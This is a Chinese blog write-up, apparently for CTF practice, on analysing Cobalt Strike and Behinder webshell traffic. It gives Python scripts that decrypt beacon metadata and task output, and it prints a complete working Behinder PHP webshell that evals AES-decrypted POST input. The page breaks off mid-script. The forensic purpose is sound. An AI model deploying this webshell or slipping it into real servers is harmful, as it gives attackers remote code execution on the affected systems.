@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":250,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="cs 流量 冰蝎流量 蚁剑流量 哥斯拉流量">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webshell流量分析">
+<meta property="og:url" content="http://example.com/2024/04/01/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="cs 流量 冰蝎流量 蚁剑流量 哥斯拉流量">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-01T13:08:41.000Z">
+<meta property="article:modified_time" content="2024-04-07T12:01:45.775Z">
+<meta property="article:author" content="小zhou">
+<meta property="article:tag" content="misc">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2024/04/01/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>webshell流量分析 | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/01/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          webshell流量分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-01 21:08:41" itemprop="dateCreated datePublished" datetime="2024-04-01T21:08:41+08:00">2024-04-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-07 20:01:45" itemprop="dateModified" datetime="2024-04-07T20:01:45+08:00">2024-04-07</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>cs 流量</p>
+<p>冰蝎流量</p>
+<p>蚁剑流量</p>
+<p>哥斯拉流量</p>
+<span id="more"></span>
+
+<h1 id="cs-流量"><a href="#cs-流量" class="headerlink" title="cs 流量"></a>cs 流量</h1><p>流量特征值</p>
+<p>存在两个文件</p>
+<p>.cobaltstrike.beacon_keys</p>
+<p>pcapng</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_arguments</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;输入JAVA序列化文件 .cobaltstrike.beacon_keys 路径&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_RSA_PriKey</span>(<span class="params">SerializeKeyPath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(SerializeKeyPath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        pobj = javaobj.load(fd)</span><br><span class="line">    privateKey = pobj.array.value.privateKey.encoded.data</span><br><span class="line">    publicKey = pobj.array.value.publicKey.encoded.data</span><br><span class="line"></span><br><span class="line">    privateKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, privateKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PRIVATE KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line">    publicKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, publicKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    privateKey = privateKey.decode()</span><br><span class="line">    publicKey = publicKey.decode()</span><br><span class="line">    <span class="keyword">return</span> publicKey, privateKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_PK_Cipher</span>(<span class="params">privateKey</span>):</span><br><span class="line">    privateKey = RSA.import_key(privateKey.encode())</span><br><span class="line">    n_bytes = privateKey.n.bit_length() // <span class="number">8</span></span><br><span class="line">    cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">    <span class="keyword">return</span> cipher, n_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">private_decrypt</span>(<span class="params">cipher_text, privateKey</span>):</span><br><span class="line">    cipher, n_bytes = create_PK_Cipher(privateKey)</span><br><span class="line">    cipher_text = base64.b64decode(cipher_text.encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(</span><br><span class="line">        cipher.decrypt(cipher_text[i: i + n_bytes], <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_text), n_bytes)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_AES_HMAC_Key</span>(<span class="params">SerializeKeyPath, rsa_cipher_text</span>):</span><br><span class="line">    _, privateKey = get_RSA_PriKey(SerializeKeyPath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (plain_text := private_decrypt(rsa_cipher_text, privateKey)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]: 解密错误, 可能是RSA_Cipher_Text或者密钥有误!&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    raw_aes_keys = plain_text[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[:<span class="number">16</span>]</span><br><span class="line">    hmac_key = digest[<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> aes_key, hmac_key, plain_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_arguments()</span><br><span class="line">    SerializeKeyPath = args.f</span><br><span class="line"><span class="comment">#此处放置load导出的cookie</span></span><br><span class="line">    rsa_cipher_text = <span class="string">&quot;xeoOUNy9EhFV01fTyqDHJTvrnfCji6iHiLabfNhxoLKdY6xA8HV8g8fmvrgs6J4d3MjdhG9ww/CAj6tEFj3Y1hfcODoOz+ggqc5jb7lcGuEHmuN7j0NawY8t5Ro7vbnDJmGF9a7Zve3v3cYHEZexDjTgfl+119fyM6hWOuXd5LM=&quot;</span></span><br><span class="line">    aes_key, hmac_key, plain_text = get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES key: <span class="subst">&#123;aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;HMAC key: <span class="subst">&#123;hmac_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    hexdump.hexdump(plain_text)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cs.py -f .cobaltstrike.beacon_keys</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AES key:5f277b49bb4b15cc0728835639d691fc</span><br><span class="line">HMAC key:8c67ccf3324dae539604a6e019a57664</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Beacon任务执行结果解密</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_mac</span>(<span class="params">mac, mac_verif</span>):</span><br><span class="line">	<span class="keyword">if</span> mac == mac_verif:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(mac) != <span class="built_in">len</span>(mac_verif):</span><br><span class="line">		<span class="built_in">print</span></span><br><span class="line">		<span class="string">&quot;invalid MAC size&quot;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	result = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(mac, mac_verif):</span><br><span class="line">		result |= x ^ y</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[<span class="number">0</span>:<span class="number">16</span>], signature):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">	cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">	data = cypher.decrypt(encrypted_data)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#key源自Beacon_metadata_RSA_Decrypt.py</span></span><br><span class="line">SHARED_KEY = binascii.unhexlify(<span class="string">&quot;5f277b49bb4b15cc0728835639d691fc&quot;</span>)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(<span class="string">&quot;8c67ccf3324dae539604a6e019a57664&quot;</span>)</span><br><span class="line"><span class="comment"># 密文 原始数据 hex 解码 base64加密</span></span><br><span class="line"></span><br><span class="line">encrypt_data=<span class="string">&quot;AAAAUJwE+4Qyg3PGsdV+8stF4umcLlO5zBdLb0WRnKAT9cEjsKqM7DiRiWBGBMpksTmEVk+s+DJY+obKpkiG3j0COF04qLaB8INl6IaF+kqCeauM&quot;</span></span><br><span class="line"></span><br><span class="line">encrypt_data=base64.b64decode(encrypt_data)</span><br><span class="line"></span><br><span class="line">encrypt_data_length=encrypt_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">encrypt_data_length=<span class="built_in">int</span>.from_bytes(encrypt_data_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:<span class="built_in">len</span>(encrypt_data)]</span><br><span class="line"></span><br><span class="line">data1=encrypt_data_l[<span class="number">0</span>:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature=encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="built_in">bytes</span>(<span class="string">&quot;abcdefghijklmnop&quot;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">counter = dec[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">counter=<span class="built_in">int</span>.from_bytes(counter, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;counter:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(counter))</span><br><span class="line"></span><br><span class="line">dec_length = dec[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">dec_length=<span class="built_in">int</span>.from_bytes(dec_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务返回长度:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(dec_length))</span><br><span class="line"></span><br><span class="line">de_data= dec[<span class="number">8</span>:<span class="built_in">len</span>(dec)]</span><br><span class="line">Task_type=de_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">Task_type=<span class="built_in">int</span>.from_bytes(Task_type, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务输出类型:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(Task_type))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(de_data[<span class="number">4</span>:dec_length].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))    <span class="comment"># 第69行</span></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure>
+
+<h1 id="冰蝎流量"><a href="#冰蝎流量" class="headerlink" title="冰蝎流量"></a>冰蝎流量</h1><p>流量特征</p>
+<p>Easy_Shark<br><a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip">https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip</a></p>
+<p>追踪http 流 发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;2295d22e2d70888f&quot;;</span><br><span class="line">	$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line">		</span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$key=&quot;2295d22e2d70888f&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">getopt</span>(<span class="string">&#x27;a:k:f:t:d:&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进入php文件\n\n\n\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>])?<span class="variable">$key</span>=<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>]:<span class="variable">$key</span>=<span class="string">&#x27;e45e329feb5d925b&#x27;</span>;</span><br><span class="line"><span 